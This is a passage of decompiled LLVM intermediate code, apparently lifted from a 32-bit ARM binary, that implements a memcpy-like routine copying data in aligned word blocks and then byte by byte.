  %v6_14af0 = icmp slt i32 %v5_14af0, 0
  store i1 %v6_14af0, i1* %cpsr_v.global-to-local, align 1
  %v7_14af0 = icmp slt i32 %v2_14af0, 0
  store i1 %v7_14af0, i1* %cpsr_n.global-to-local, align 1
  %v5_14af4 = icmp slt i32 %v0_14af0, 4
  br i1 %v5_14af4, label %bb133, label %dec_label_pc_14af8

dec_label_pc_14af8:                               ; preds = %bb
  %v1_14af8 = urem i32 %v1_14ae0, 4
  store i32 %v1_14af8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14af8 = icmp eq i32 %v1_14af8, 0
  br i1 %v2_14af8, label %dec_label_pc_14b00, label %dec_label_pc_14ba4

dec_label_pc_14b00:                               ; preds = %dec_label_pc_14af8
  %v1_14b00 = urem i32 %v0_14ae0, 4
  store i32 %v1_14b00, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14b00 = icmp eq i32 %v1_14b00, 0
  %extract.t = trunc i32 %v0_14ae0 to i2
  br i1 %v2_14b00, label %dec_label_pc_14b08, label %dec_label_pc_14bd4

dec_label_pc_14b08:                               ; preds = %dec_label_pc_14b00, %dec_label_pc_14bcc
  %v0_14b2093 = phi i32 [ %v1_14ae0, %dec_label_pc_14b00 ], [ %v0_14c1c76, %dec_label_pc_14bcc ]
  %v0_14b1c92 = phi i32 [ %v0_14ae0, %dec_label_pc_14b00 ], [ %v0_14bcc, %dec_label_pc_14bcc ]
  %v0_14b08 = phi i32 [ %v2_14af0, %dec_label_pc_14b00 ], [ %v2_14bc4, %dec_label_pc_14bcc ]
  %v2_14b08 = add i32 %v0_14b08, -8
  store i32 %v2_14b08, i32* %r2.global-to-local, align 4
  %v4_14b08 = sub i32 7, %v0_14b08
  %v5_14b08 = and i32 %v4_14b08, %v0_14b08
  %v6_14b08 = icmp slt i32 %v5_14b08, 0
  store i1 %v6_14b08, i1* %cpsr_v.global-to-local, align 1
  %v7_14b08 = icmp slt i32 %v2_14b08, 0
  store i1 %v7_14b08, i1* %cpsr_n.global-to-local, align 1
  %v5_14b0c = icmp slt i32 %v0_14b08, 8
  br i1 %v5_14b0c, label %dec_label_pc_14b5c, label %dec_label_pc_14b10

dec_label_pc_14b10:                               ; preds = %dec_label_pc_14b08
  %v2_14b10 = add i32 %v0_14b08, -28
  store i32 %v2_14b10, i32* %r2.global-to-local, align 4
  %v4_14b10 = sub i32 27, %v0_14b08
  %v5_14b10 = and i32 %v4_14b10, %v2_14b08
  %v6_14b10 = icmp slt i32 %v5_14b10, 0
  store i1 %v6_14b10, i1* %cpsr_v.global-to-local, align 1
  %v7_14b10 = icmp slt i32 %v2_14b10, 0
  store i1 %v7_14b10, i1* %cpsr_n.global-to-local, align 1
  %v5_14b14 = icmp slt i32 %v2_14b08, 20
  br i1 %v5_14b14, label %dec_label_pc_14b48, label %dec_label_pc_14b18

dec_label_pc_14b18:                               ; preds = %dec_label_pc_14b10
  %v0_14b18 = load i32, i32* @r4, align 4
  store i32 %v0_14b18, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14b1c

dec_label_pc_14b1c:                               ; preds = %dec_label_pc_14b1c.dec_label_pc_14b1c_crit_edge, %dec_label_pc_14b18
  %v0_14b20 = phi i32 [ %v12_14b28, %dec_label_pc_14b1c.dec_label_pc_14b1c_crit_edge ], [ %v0_14b2093, %dec_label_pc_14b18 ]
  %v0_14b1c = phi i32 [ %v0_14b1c.pre, %dec_label_pc_14b1c.dec_label_pc_14b1c_crit_edge ], [ %v0_14b1c92, %dec_label_pc_14b18 ]
  %v1_14b1c = inttoptr i32 %v0_14b1c to i32*
  %v2_14b1c = load i32, i32* %v1_14b1c, align 4
  store i32 %v2_14b1c, i32* %r3.global-to-local, align 4
  %v3_14b1c = add i32 %v0_14b1c, 4
  %v4_14b1c = inttoptr i32 %v3_14b1c to i32*
  %v5_14b1c = load i32, i32* %v4_14b1c, align 4
  store i32 %v5_14b1c, i32* %r4.global-to-local, align 4
  %v6_14b1c = add i32 %v0_14b1c, 8
  %v7_14b1c = inttoptr i32 %v6_14b1c to i32*
  %v8_14b1c = load i32, i32* %v7_14b1c, align 4
  store i32 %v8_14b1c, i32* %ip.global-to-local, align 4
  %v9_14b1c = add i32 %v0_14b1c, 12
  %v10_14b1c = inttoptr i32 %v9_14b1c to i32*
  %v11_14b1c = load i32, i32* %v10_14b1c, align 4
  store i32 %v11_14b1c, i32* %lr.global-to-local, align 4
  %v12_14b1c = add i32 %v0_14b1c, 16
  store i32 %v12_14b1c, i32* %r1.global-to-local, align 4
  %v1_14b20 = inttoptr i32 %v0_14b20 to i32*
  store i32 %v2_14b1c, i32* %v1_14b20, align 4
  %v3_14b20 = add i32 %v0_14b20, 4
  %v4_14b20 = inttoptr i32 %v3_14b20 to i32*
  %v5_14b20 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14b20, i32* %v4_14b20, align 4
  %v6_14b20 = add i32 %v0_14b20, 8
  %v7_14b20 = inttoptr i32 %v6_14b20 to i32*
  %v8_14b20 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_14b20, i32* %v7_14b20, align 4
  %v9_14b20 = add i32 %v0_14b20, 12
  %v10_14b20 = inttoptr i32 %v9_14b20 to i32*
  %v11_14b20 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_14b20, i32* %v10_14b20, align 4
  %v12_14b20 = add i32 %v0_14b20, 16
  store i32 %v12_14b20, i32* %r0.global-to-local, align 4
  %v0_14b24 = load i32, i32* %r1.global-to-local, align 4
  %v1_14b24 = inttoptr i32 %v0_14b24 to i32*
  %v2_14b24 = load i32, i32* %v1_14b24, align 4
  store i32 %v2_14b24, i32* %r3.global-to-local, align 4
  %v3_14b24 = add i32 %v0_14b24, 4
  %v4_14b24 = inttoptr i32 %v3_14b24 to i32*
  %v5_14b24 = load i32, i32* %v4_14b24, align 4
  store i32 %v5_14b24, i32* %r4.global-to-local, align 4
  %v6_14b24 = add i32 %v0_14b24, 8
  %v7_14b24 = inttoptr i32 %v6_14b24 to i32*
  %v8_14b24 = load i32, i32* %v7_14b24, align 4
  store i32 %v8_14b24, i32* @ip, align 4
  %v9_14b24 = add i32 %v0_14b24, 12
  %v10_14b24 = inttoptr i32 %v9_14b24 to i32*
  %v11_14b24 = load i32, i32* %v10_14b24, align 4
  store i32 %v11_14b24, i32* @lr, align 4
  %v12_14b24 = add i32 %v0_14b24, 16
  store i32 %v12_14b24, i32* @r1, align 4
  %v1_14b28 = inttoptr i32 %v12_14b20 to i32*
  store i32 %v2_14b24, i32* %v1_14b28, align 4
  %v3_14b28 = add i32 %v0_14b20, 20
  %v4_14b28 = inttoptr i32 %v3_14b28 to i32*
  %v5_14b28 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14b28, i32* %v4_14b28, align 4
  %v6_14b28 = add i32 %v0_14b20, 24
  %v7_14b28 = inttoptr i32 %v6_14b28 to i32*
  %v8_14b28 = load i32, i32* @ip, align 4
  store i32 %v8_14b28, i32* %v7_14b28, align 4
  %v9_14b28 = add i32 %v0_14b20, 28
  %v10_14b28 = inttoptr i32 %v9_14b28 to i32*
  %v11_14b28 = load i32, i32* @lr, align 4
  store i32 %v11_14b28, i32* %v10_14b28, align 4
  %v12_14b28 = add i32 %v0_14b20, 32
  store i32 %v12_14b28, i32* %r0.global-to-local, align 4
  %v0_14b2c = load i32, i32* %r2.global-to-local, align 4
  %v2_14b2c = add i32 %v0_14b2c, -32
  store i32 %v2_14b2c, i32* %r2.global-to-local, align 4
  %v6_14b30 = icmp slt i32 %v0_14b2c, 32
  br i1 %v6_14b30, label %dec_label_pc_14b34, label %dec_label_pc_14b1c.dec_label_pc_14b1c_crit_edge

dec_label_pc_14b1c.dec_label_pc_14b1c_crit_edge:  ; preds = %dec_label_pc_14b1c
  %v0_14b1c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_14b1c

dec_label_pc_14b34:                               ; preds = %dec_label_pc_14b1c
  %v4_14b34 = add i32 %v0_14b2c, -16
  %v6_14b34 = add i32 %v0_14b2c, 2147483616
  %v7_14b34 = and i32 %v4_14b34, %v6_14b34
  %v8_14b34 = icmp slt i32 %v7_14b34, 0
  store i1 %v8_14b34, i1* %cpsr_v.global-to-local, align 1
  %v9_14b34 = icmp slt i32 %v4_14b34, 0
  store i1 %v9_14b34, i1* %cpsr_n.global-to-local, align 1
  %v5_14b38 = icmp slt i32 %v2_14b2c, -16
  br i1 %v5_14b38, label %.thread2, label %bb130

bb130:                                            ; preds = %dec_label_pc_14b34
  %v6_14b38 = load i32, i32* @r1, align 4
  %v7_14b38 = inttoptr i32 %v6_14b38 to i32*
  %v8_14b38 = load i32, i32* %v7_14b38, align 4
  store i32 %v8_14b38, i32* %r3.global-to-local, align 4
  %v9_14b38 = add i32 %v6_14b38, 4
  %v10_14b38 = inttoptr i32 %v9_14b38 to i32*
  %v11_14b38 = load i32, i32* %v10_14b38, align 4
  store i32 %v11_14b38, i32* %r4.global-to-local, align 4
  %v12_14b38 = add i32 %v6_14b38, 8
  %v13_14b38 = inttoptr i32 %v12_14b38 to i32*
  %v14_14b38 = load i32, i32* %v13_14b38, align 4
  store i32 %v14_14b38, i32* @ip, align 4
  %v15_14b38 = add i32 %v6_14b38, 12
  %v16_14b38 = inttoptr i32 %v15_14b38 to i32*
  %v17_14b38 = load i32, i32* %v16_14b38, align 4
  store i32 %v17_14b38, i32* @lr, align 4
  %v18_14b38 = add i32 %v6_14b38, 16
  store i32 %v18_14b38, i32* @r1, align 4
  %v7_14b3c = inttoptr i32 %v12_14b28 to i32*
  store i32 %v8_14b38, i32* %v7_14b3c, align 4
  %v9_14b3c = add i32 %v0_14b20, 36
  %v10_14b3c = inttoptr i32 %v9_14b3c to i32*
  %v11_14b3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_14b3c, i32* %v10_14b3c, align 4
  %v12_14b3c = add i32 %v0_14b20, 40
  %v13_14b3c = inttoptr i32 %v12_14b3c to i32*
  %v14_14b3c = load i32, i32* @ip, align 4
  store i32 %v14_14b3c, i32* %v13_14b3c, align 4
  %v15_14b3c = add i32 %v0_14b20, 44
  %v16_14b3c = inttoptr i32 %v15_14b3c to i32*
  %v17_14b3c = load i32, i32* @lr, align 4
  store i32 %v17_14b3c, i32* %v16_14b3c, align 4
  %v18_14b3c = add i32 %v0_14b20, 48
  store i32 %v18_14b3c, i32* %r0.global-to-local, align 4
  %v6_14b40 = load i32, i32* %r2.global-to-local, align 4
  %v7_14b40 = add i32 %v6_14b40, -16
  store i32 %v7_14b40, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14b34, %bb130
  %v3_14b50102 = phi i32 [ %v12_14b28, %dec_label_pc_14b34 ], [ %v18_14b3c, %bb130 ]
  %v0_14b4896 = phi i32 [ %v2_14b2c, %dec_label_pc_14b34 ], [ %v7_14b40, %bb130 ]
  %v2_14b44 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14b44, i32* @r4, align 4
  br label %dec_label_pc_14b48

dec_label_pc_14b48:                               ; preds = %dec_label_pc_14b10, %.thread2
  %v3_14b50101 = phi i32 [ %v0_14b2093, %dec_label_pc_14b10 ], [ %v3_14b50102, %.thread2 ]
  %v0_14b48 = phi i32 [ %v2_14b10, %dec_label_pc_14b10 ], [ %v0_14b4896, %.thread2 ]
  %v1_14b48 = add i32 %v0_14b48, 20
  store i32 %v1_14b48, i32* %r2.global-to-local, align 4
  %v3_14b48 = sub i32 0, %v0_14b48
  %v4_14b48 = and i32 %v1_14b48, %v3_14b48
  %v5_14b48 = icmp slt i32 %v4_14b48, 0
  store i1 %v5_14b48, i1* %cpsr_v.global-to-local, align 1
  %v6_14b48 = icmp slt i32 %v1_14b48, 0
  store i1 %v6_14b48, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14b4c

dec_label_pc_14b4c:                               ; preds = %.thread118, %dec_label_pc_14b48
  %v0_14b5c.pre149 = phi i32 [ %v0_14b5c.pre, %.thread118 ], [ %v1_14b48, %dec_label_pc_14b48 ]
  %v3_14b50 = phi i32 [ %v3_14b5099119, %.thread118 ], [ %v3_14b50101, %dec_label_pc_14b48 ]
  %v1_14b54 = phi i1 [ %v1_14b58, %.thread118 ], [ %v5_14b48, %dec_label_pc_14b48 ]
  %v0_14b54 = phi i1 [ %v0_14b58, %.thread118 ], [ %v6_14b48, %dec_label_pc_14b48 ]
  %v2_14b4c = xor i1 %v1_14b54, %v0_14b54
  br i1 %v2_14b4c, label %.thread118, label %bb131

bb131:                                            ; preds = %dec_label_pc_14b4c
  %v3_14b4c = load i32, i32* @r1, align 4
  %v4_14b4c = inttoptr i32 %v3_14b4c to i32*
  %v5_14b4c = load i32, i32* %v4_14b4c, align 4
  store i32 %v5_14b4c, i32* %r3.global-to-local, align 4
  %v6_14b4c = add i32 %v3_14b4c, 4
  %v7_14b4c = inttoptr i32 %v6_14b4c to i32*
  %v8_14b4c = load i32, i32* %v7_14b4c, align 4
  store i32 %v8_14b4c, i32* @ip, align 4
  %v9_14b4c = add i32 %v3_14b4c, 8
  %v10_14b4c = inttoptr i32 %v9_14b4c to i32*
  %v11_14b4c = load i32, i32* %v10_14b4c, align 4
  store i32 %v11_14b4c, i32* @lr, align 4
  %v12_14b4c = add i32 %v3_14b4c, 12
  store i32 %v12_14b4c, i32* @r1, align 4
  %v4_14b50 = inttoptr i32 %v3_14b50 to i32*
  store i32 %v5_14b4c, i32* %v4_14b50, align 4
  %v6_14b50 = add i32 %v3_14b50, 4
  %v7_14b50 = inttoptr i32 %v6_14b50 to i32*
  %v8_14b50 = load i32, i32* @ip, align 4
  store i32 %v8_14b50, i32* %v7_14b50, align 4
  %v9_14b50 = add i32 %v3_14b50, 8
  %v10_14b50 = inttoptr i32 %v9_14b50 to i32*
  %v11_14b50 = load i32, i32* @lr, align 4
  store i32 %v11_14b50, i32* %v10_14b50, align 4
  %v12_14b50 = add i32 %v3_14b50, 12
  store i32 %v12_14b50, i32* %r0.global-to-local, align 4
  %v3_14b54 = load i32, i32* %r2.global-to-local, align 4
  %v4_14b54 = add i32 %v3_14b54, -12
  store i32 %v4_14b54, i32* %r2.global-to-local, align 4
  %v6_14b54 = sub i32 11, %v3_14b54
  %v7_14b54 = and i32 %v6_14b54, %v3_14b54
  %v8_14b54 = icmp slt i32 %v7_14b54, 0
  store i1 %v8_14b54, i1* %cpsr_v.global-to-local, align 1
  %v9_14b54 = icmp slt i32 %v4_14b54, 0
  store i1 %v9_14b54, i1* %cpsr_n.global-to-local, align 1
  br label %.thread118

.thread118:                                       ; preds = %dec_label_pc_14b4c, %bb131
  %v0_14b5c.pre = phi i32 [ %v4_14b54, %bb131 ], [ %v0_14b5c.pre149, %dec_label_pc_14b4c ]
  %v3_14b5099119 = phi i32 [ %v12_14b50, %bb131 ], [ %v3_14b50, %dec_label_pc_14b4c ]
  %v1_14b58 = phi i1 [ %v8_14b54, %bb131 ], [ %v1_14b54, %dec_label_pc_14b4c ]
  %v0_14b58 = phi i1 [ %v9_14b54, %bb131 ], [ %v0_14b54, %dec_label_pc_14b4c ]
  %v2_14b58 = xor i1 %v1_14b58, %v0_14b58
  br i1 %v2_14b58, label %dec_label_pc_14b5c, label %dec_label_pc_14b4c

dec_label_pc_14b5c:                               ; preds = %.thread118, %dec_label_pc_14b08
  %v7_14b6c = phi i32 [ %v0_14b2093, %dec_label_pc_14b08 ], [ %v3_14b5099119, %.thread118 ]
  %v0_14b5c = phi i32 [ %v2_14b08, %dec_label_pc_14b08 ], [ %v0_14b5c.pre, %.thread118 ]
  %v2_14b5c = add i32 %v0_14b5c, 8
  store i32 %v2_14b5c, i32* %r2.global-to-local, align 4
  %v4_14b5c = sub i32 0, %v0_14b5c
  %v5_14b5c = and i32 %v2_14b5c, %v4_14b5c
  %v6_14b5c = icmp slt i32 %v5_14b5c, 0
  store i1 %v6_14b5c, i1* %cpsr_v.global-to-local, align 1
  %v7_14b5c = icmp slt i32 %v2_14b5c, 0
  store i1 %v7_14b5c, i1* %cpsr_n.global-to-local, align 1
  %v5_14b60 = icmp slt i32 %v0_14b5c, -8
  br i1 %v5_14b60, label %bb133, label %dec_label_pc_14b64

dec_label_pc_14b64:                               ; preds = %dec_label_pc_14b5c
  %v6_14b64 = add i32 %v0_14b5c, 4
  store i32 %v6_14b64, i32* %r2.global-to-local, align 4
  %v8_14b64 = sub i32 -5, %v0_14b5c
  %v9_14b64 = and i32 %v8_14b64, %v2_14b5c
  %v10_14b64 = icmp slt i32 %v9_14b64, 0
  store i1 %v10_14b64, i1* %cpsr_v.global-to-local, align 1
  %v11_14b64 = icmp slt i32 %v6_14b64, 0
  store i1 %v11_14b64, i1* %cpsr_n.global-to-local, align 1
  %v5_14b68 = icmp slt i32 %v2_14b5c, 4
  %v6_14b68 = load i32, i32* @r1, align 4
  %v7_14b68 = inttoptr i32 %v6_14b68 to i32*
  %v8_14b68 = load i32, i32* %v7_14b68, align 4
  store i32 %v8_14b68, i32* %r3.global-to-local, align 4
  %v10_14b68 = add i32 %v6_14b68, 4
  br i1 %v5_14b68, label %.thread6, label %bb132

.thread6:                                         ; preds = %dec_label_pc_14b64
  store i32 %v10_14b68, i32* @r1, align 4
  %v8_14b6c = inttoptr i32 %v7_14b6c to i32*
  store i32 %v8_14b68, i32* %v8_14b6c, align 4
  %v9_14b6c = load i32, i32* %r0.global-to-local, align 4
  %v10_14b6c = add i32 %v9_14b6c, 4
  store i32 %v10_14b6c, i32* %r0.global-to-local, align 4
  %v0_14b7c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb133

bb132:                                            ; preds = %dec_label_pc_14b64
  %v10_14b70 = inttoptr i32 %v10_14b68 to i32*
  %v11_14b70 = load i32, i32* %v10_14b70, align 4
  store i32 %v11_14b70, i32* @ip, align 4
  %v12_14b70 = add i32 %v6_14b68, 8
  store i32 %v12_14b70, i32* @r1, align 4
  %v7_14b74 = inttoptr i32 %v7_14b6c to i32*
  store i32 %v8_14b68, i32* %v7_14b74, align 4
  %v9_14b74 = add i32 %v7_14b6c, 4
  %v10_14b74 = inttoptr i32 %v9_14b74 to i32*
  %v11_14b74 = load i32, i32* @ip, align 4
  store i32 %v11_14b74, i32* %v10_14b74, align 4
  %v12_14b74 = add i32 %v7_14b6c, 8
  store i32 %v12_14b74, i32* %r0.global-to-local, align 4
  %v6_14b78 = load i32, i32* %r2.global-to-local, align 4
  %v7_14b78 = add i32 %v6_14b78, -4
  store i32 %v7_14b78, i32* %r2.global-to-local, align 4
  br label %bb133

bb133:                                            ; preds = %.thread6, %.thread12, %dec_label_pc_14b5c, %bb, %dec_label_pc_14d24, %dec_label_pc_14c4c, %dec_label_pc_14cb8, %bb132
  %v2_14b8c = phi i32 [ %v10_14b6c, %.thread6 ], [ %v0_14c1c76, %.thread12 ], [ %v7_14b6c, %dec_label_pc_14b5c ], [ %v1_14ae0, %bb ], [ %v2_14b8c114, %dec_label_pc_14d24 ], [ %v2_14b8c113, %dec_label_pc_14c4c ], [ %v2_14b8c112, %dec_label_pc_14cb8 ], [ %v12_14b74, %bb132 ]
  %v0_14b7c = phi i32 [ %v0_14b7c.pre, %.thread6 ], [ %v2_14bc4, %.thread12 ], [ %v2_14b5c, %dec_label_pc_14b5c ], [ %v2_14af0, %bb ], [ %v0_14b7c110, %dec_label_pc_14d24 ], [ %v0_14b7c109, %dec_label_pc_14c4c ], [ %v0_14b7c108, %dec_label_pc_14cb8 ], [ %v7_14b78, %bb132 ]
  %v1_14b7c = add i32 %v0_14b7c, 4
  store i32 %v1_14b7c, i32* @r2, align 4
  %v3_14b7c = sub i32 0, %v0_14b7c
  %v4_14b7c = and i32 %v1_14b7c, %v3_14b7c
  %v5_14b7c = icmp slt i32 %v4_14b7c, 0
  store i1 %v5_14b7c, i1* %cpsr_v.global-to-local, align 1
  %v6_14b7c = icmp slt i32 %v1_14b7c, 0
  store i1 %v6_14b7c, i1* %cpsr_n.global-to-local, align 1
  %v7_14b7c = icmp eq i32 %v1_14b7c, 0
  store i1 %v7_14b7c, i1* @cpsr_z, align 1
  br i1 %v7_14b7c, label %bb134, label %bb135

bb134:                                            ; preds = %bb133
  %v3_14b80 = load i8*, i8** %stack_var_-8, align 4
  %v4_14b80 = ptrtoint i8* %v3_14b80 to i32
  store i32 %v4_14b80, i32* %r0.global-to-local, align 4
  ret i32 %v4_14b80

bb135:                                            ; preds = %bb133
  %v1_14b84 = add i32 %v0_14b7c, 2
  %v3_14b84 = sub i32 -3, %v0_14b7c
  %v4_14b84 = and i32 %v3_14b84, %v1_14b7c
  %v5_14b84 = icmp slt i32 %v4_14b84, 0
  store i1 %v5_14b84, i1* %cpsr_v.global-to-local, align 1
  %v6_14b84 = icmp slt i32 %v1_14b84, 0
  store i1 %v6_14b84, i1* %cpsr_n.global-to-local, align 1
  %v7_14b84 = icmp eq i32 %v1_14b7c, 2
  store i1 %v7_14b84, i1* @cpsr_z, align 1
  %v0_14b88 = load i32, i32* @r1, align 4
  %v1_14b88 = inttoptr i32 %v0_14b88 to i8*
  %v2_14b88 = load i8, i8* %v1_14b88, align 1
  %v3_14b88 = zext i8 %v2_14b88 to i32
  store i32 %v3_14b88, i32* %r3.global-to-local, align 4
  %v5_14b88 = add i32 %v0_14b88, 1
  store i32 %v5_14b88, i32* @r1, align 4
  %v3_14b8c = inttoptr i32 %v2_14b8c to i8*
  store i8 %v2_14b88, i8* %v3_14b8c, align 1
  %v4_14b8c = load i32, i32* %r0.global-to-local, align 4
  %v5_14b8c = add i32 %v4_14b8c, 1
  store i32 %v5_14b8c, i32* %r0.global-to-local, align 4
  %v0_14b90 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14b90 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_14b90 = xor i1 %v0_14b90, %v1_14b90
  br i1 %v2_14b90, label %.thread120, label %bb136

bb136:                                            ; preds = %bb135
  %v3_14b90 = load i32, i32* @r1, align 4
  %v4_14b90 = inttoptr i32 %v3_14b90 to i8*
  %v5_14b90 = load i8, i8* %v4_14b90, align 1
  %v6_14b90 = zext i8 %v5_14b90 to i32
  store i32 %v6_14b90, i32* %r3.global-to-local, align 4
  %v8_14b90 = add i32 %v3_14b90, 1
  store i32 %v8_14b90, i32* @r1, align 4
  %v6_14b94 = inttoptr i32 %v5_14b8c to i8*
  store i8 %v5_14b90, i8* %v6_14b94, align 1
  %v7_14b94 = load i32, i32* %r0.global-to-local, align 4
  %v8_14b94 = add i32 %v7_14b94, 1
  store i32 %v8_14b94, i32* %r0.global-to-local, align 4
  %v1_14b98.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14b98.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread120

.thread120:                                       ; preds = %bb135, %bb136
  %v7_14b9c = phi i32 [ %v8_14b94, %bb136 ], [ %v5_14b8c, %bb135 ]
  %v2_14b9c = phi i1 [ %v2_14b98.pre, %bb136 ], [ %v1_14b90, %bb135 ]
  %v1_14b9c = phi i1 [ %v1_14b98.pre, %bb136 ], [ %v0_14b90, %bb135 ]
  %v0_14b98 = load i1, i1* @cpsr_z, align 1
  %v3_14b98 = xor i1 %v2_14b9c, %v1_14b9c
  %v4_14b98 = or i1 %v0_14b98, %v3_14b98
  br i1 %v4_14b98, label %.thread121, label %bb137

bb137:                                            ; preds = %.thread120
  %v5_14b98 = load i32, i32* @r1, align 4
  %v6_14b98 = inttoptr i32 %v5_14b98 to i8*
  %v7_14b98 = load i8, i8* %v6_14b98, align 1
  %v8_14b98 = zext i8 %v7_14b98 to i32
  store i32 %v8_14b98, i32* %r3.global-to-local, align 4
  %v10_14b98 = add i32 %v5_14b98, 1
  store i32 %v10_14b98, i32* @r1, align 4
  %v8_14b9c = inttoptr i32 %v7_14b9c to i8*
  store i8 %v7_14b98, i8* %v8_14b9c, align 1
  %v9_14b9c = load i32, i32* %r0.global-to-local, align 4
  %v10_14b9c = add i32 %v9_14b9c, 1
  store i32 %v10_14b9c, i32* %r0.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %.thread120, %bb137
  %v2_14ba0 = load i8*, i8** %stack_var_-8, align 4
  %v3_14ba0 = ptrtoint i8* %v2_14ba0 to i32
  store i32 %v3_14ba0, i32* %r0.global-to-local, align 4
  ret i32 %v3_14ba0

dec_label_pc_14ba4:                               ; preds = %dec_label_pc_14af8
  %v1_14ba4 = sub nsw i32 4, %v1_14af8
  store i32 %v1_14ba4, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_14ba8 = icmp ult i32 %v1_14ba4, 2
  store i1 %v8_14ba8, i1* %cpsr_n.global-to-local, align 1
  %v1_14bac = inttoptr i32 %v0_14ae0 to i8*
  %v2_14bac = load i8, i8* %v1_14bac, align 1
  %v3_14bac = zext i8 %v2_14bac to i32
  store i32 %v3_14bac, i32* %r3.global-to-local, align 4
  %v5_14bac = add i32 %v0_14ae0, 1
  store i32 %v5_14bac, i32* @r1, align 4
  store i8 %v2_14bac, i8* %v5_14aec, align 1
  %v4_14bb0 = load i32, i32* %r0.global-to-local, align 4
  %v5_14bb0 = add i32 %v4_14bb0, 1
  store i32 %v5_14bb0, i32* %r0.global-to-local, align 4
  br i1 %v8_14ba8, label %.thread12, label %bb138

bb138:                                            ; preds = %dec_label_pc_14ba4
  %v9_14ba8 = icmp eq i32 %v1_14ba4, 2
  %v6_14bb4 = load i32, i32* @r1, align 4
  %v7_14bb4 = inttoptr i32 %v6_14bb4 to i8*
  %v8_14bb4 = load i8, i8* %v7_14bb4, align 1
  %v9_14bb4 = zext i8 %v8_14bb4 to i32
  store i32 %v9_14bb4, i32* %r3.global-to-local, align 4
  %v11_14bb4 = add i32 %v6_14bb4, 1
  store i32 %v11_14bb4, i32* @r1, align 4
  %v9_14bb8 = inttoptr i32 %v5_14bb0 to i8*
  store i8 %v8_14bb4, i8* %v9_14bb8, align 1
  %v10_14bb8 = load i32, i32* %r0.global-to-local, align 4
  %v11_14bb8 = add i32 %v10_14bb8, 1
  store i32 %v11_14bb8, i32* %r0.global-to-local, align 4
  br i1 %v9_14ba8, label %.thread12, label %bb139

bb139:                                            ; preds = %bb138
  %v8_14bbc = load i32, i32* @r1, align 4
  %v9_14bbc = inttoptr i32 %v8_14bbc to i8*
  %v10_14bbc = load i8, i8* %v9_14bbc, align 1
  %v11_14bbc = zext i8 %v10_14bbc to i32
  store i32 %v11_14bbc, i32* %r3.global-to-local, align 4
  %v13_14bbc = add i32 %v8_14bbc, 1
  store i32 %v13_14bbc, i32* @r1, align 4
  %v11_14bc0 = inttoptr i32 %v11_14bb8 to i8*
  store i8 %v10_14bbc, i8* %v11_14bc0, align 1
  %v12_14bc0 = load i32, i32* %r0.global-to-local, align 4
  %v13_14bc0 = add i32 %v12_14bc0, 1
  store i32 %v13_14bc0, i32* %r0.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb138, %dec_label_pc_14ba4, %bb139
  %v0_14c1c76 = phi i32 [ %v11_14bb8, %bb138 ], [ %v5_14bb0, %dec_label_pc_14ba4 ], [ %v13_14bc0, %bb139 ]
  %v0_14bc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14bc4 = load i32, i32* @ip, align 4
  %v2_14bc4 = sub i32 %v0_14bc4, %v1_14bc4
  store i32 %v2_14bc4, i32* %r2.global-to-local, align 4
  %v4_14bc4 = xor i32 %v1_14bc4, %v0_14bc4
  %v5_14bc4 = xor i32 %v2_14bc4, %v0_14bc4
  %v6_14bc4 = and i32 %v5_14bc4, %v4_14bc4
  %v7_14bc4 = icmp slt i32 %v6_14bc4, 0
  store i1 %v7_14bc4, i1* %cpsr_v.global-to-local, align 1
  %v8_14bc4 = icmp slt i32 %v2_14bc4, 0
  store i1 %v8_14bc4, i1* %cpsr_n.global-to-local, align 1
  %v5_14bc8 = icmp slt i32 %v0_14bc4, %v1_14bc4
  br i1 %v5_14bc8, label %bb133, label %dec_label_pc_14bcc

dec_label_pc_14bcc:                               ; preds = %.thread12
  %v0_14bcc = load i32, i32* @r1, align 4
  %v1_14bcc = urem i32 %v0_14bcc, 4
  store i32 %v1_14bcc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14bcc = icmp eq i32 %v1_14bcc, 0
  %extract.t124 = trunc i32 %v0_14bcc to i2
  br i1 %v2_14bcc, label %dec_label_pc_14b08, label %dec_label_pc_14bd4

dec_label_pc_14bd4:                               ; preds = %dec_label_pc_14b00, %dec_label_pc_14bcc
  %v0_14c1c75 = phi i32 [ %v1_14ae0, %dec_label_pc_14b00 ], [ %v0_14c1c76, %dec_label_pc_14bcc ]
  %v0_14cc8 = phi i32 [ %v2_14af0, %dec_label_pc_14b00 ], [ %v2_14bc4, %dec_label_pc_14bcc ]
  %v0_14bdc.off0 = phi i2 [ %extract.t, %dec_label_pc_14b00 ], [ %extract.t124, %dec_label_pc_14bcc ]
  %v0_14bd4 = phi i32 [ %v0_14ae0, %dec_label_pc_14b00 ], [ %v0_14bcc, %dec_label_pc_14bcc ]
  %v1_14bd4 = and i32 %v0_14bd4, -4
  store i32 %v1_14bd4, i32* %r1.global-to-local, align 4
  %v1_14bd8 = inttoptr i32 %v1_14bd4 to i32*
  %v2_14bd8 = load i32, i32* %v1_14bd8, align 4
  store i32 %v2_14bd8, i32* @lr, align 4
  %v4_14bd8 = add i32 %v1_14bd4, 4
  store i32 %v4_14bd8, i32* %r1.global-to-local, align 4
  %v2_14cc0 = add i32 %v0_14cc8, -12
  %v4_14cc0 = sub i32 11, %v0_14cc8
  %v5_14cc0 = and i32 %v4_14cc0, %v0_14cc8
